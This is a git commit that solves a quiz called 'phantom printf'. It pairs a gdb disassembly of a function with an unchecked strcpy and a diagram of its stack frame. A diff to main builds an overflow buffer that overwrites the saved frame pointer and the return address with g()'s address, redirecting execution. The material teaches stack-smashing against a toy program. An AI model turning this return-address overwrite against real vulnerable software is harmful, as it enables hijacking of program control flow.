39d6550b75d7cda0811995327da686ec8e3b6604
Ilan Smith <lunnys@gmail.com>
2015-12-30 17:20:51 +0200

    quiz: phantom printf - solution
    (gdb) disassemble
    Dump of assembler code for function f:
       0x0000000000400625 <+0>:     push   %rbp
       0x0000000000400626 <+1>:     mov    %rsp,%rbp
       0x0000000000400629 <+4>:     sub    $0x20,%rsp
       0x000000000040062d <+8>:     mov    %rdi,-0x18(%rbp)
       0x0000000000400631 <+12>:    mov    -0x18(%rbp),%rdx
       0x0000000000400635 <+16>:    lea    -0x10(%rbp),%rax
       0x0000000000400639 <+20>:    mov    %rdx,%rsi
       0x000000000040063c <+23>:    mov    %rax,%rdi
       0x000000000040063f <+26>:    callq  0x4004c0 <strcpy@plt>
       0x0000000000400644 <+31>:    movb   $0x0,-0xd(%rbp)
       0x0000000000400648 <+35>:    lea    -0x10(%rbp),%rax
       0x000000000040064c <+39>:    mov    %rax,%rsi
       0x000000000040064f <+42>:    mov    $0x40078c,%edi
       0x0000000000400654 <+47>:    mov    $0x0,%eax
       0x0000000000400659 <+52>:    callq  0x4004e0 <printf@plt>
       0x000000000040065e <+57>:    leaveq
       0x000000000040065f <+58>:    retq
    
    Assuming f() stack frame is organized as follows:
    
       stack address    what's there
       --------------   ---------------
       0x7fffffffd580    |
       0x7fffffffd578   return address
       0x7fffffffd570   $rbp
       .                 |
       .                 |
       .                unused!
       .                 |
       .                 |
       0x7fffffffd562   dst[3]
       0x7fffffffd562   dst[2]
       0x7fffffffd561   dst[1]
       0x7fffffffd560   dst[0]
       0x7fffffffd55f    |
       .                 |
       .                src
       .                 |
       0x7fffffffd558    |
    
    Then to re-write the return address it is necessary to overwrite
    (using unsinged longs of size eightbyte):
    
       0x7fffffffd580: 0x00
       0x7fffffffd578: g() address
       0x7fffffffd570: 0xffffffffffffffff
       0x7fffffffd568: 0xffffffffffffffff
       0x7fffffffd560: 0xffffffffffffffff

--- quiz.c
+++ quiz.c
@@ -25,6 +25,11 @@ int main(int argc, char *argv[])
 	   - May insert code only here
 	   - Must not call g() directly
 	*/
+	((unsigned long*)buf)[0] = 0xffffffffff636261; /* dst             */
+	((unsigned long*)buf)[1] = 0xffffffffffffffff; /* unused          */
+	((unsigned long*)buf)[2] = 0xffffffffffffffff; /* previous rbp    */
+	((unsigned long*)buf)[3] = (unsigned long)&g;  /* return address  */
+	*(buf + 4*sizeof(unsigned long)) = 0x0;        /* null terminator */
 
 	f(buf);
 	return 0;
